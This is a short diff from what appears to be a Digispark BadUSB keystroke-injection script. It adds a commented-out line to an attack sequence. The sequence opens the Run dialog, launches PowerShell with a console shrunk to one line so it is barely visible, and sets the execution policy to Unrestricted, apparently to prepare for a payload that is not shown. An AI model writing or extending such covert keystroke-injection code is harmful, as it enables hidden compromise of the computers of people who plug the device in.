@@ -126,6 +126,7 @@ DigiKeyboard.delay(500);
 DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 DigiKeyboard.delay(500);
 DigiKeyboard.print("powershell -noe -c \". mode.com con: lines=1 cols=40\"");
+//DigiKeyboard.print("cmd /k mode con:cols=20 lines=1");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(3000);
 DigiKeyboard.print("Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted");
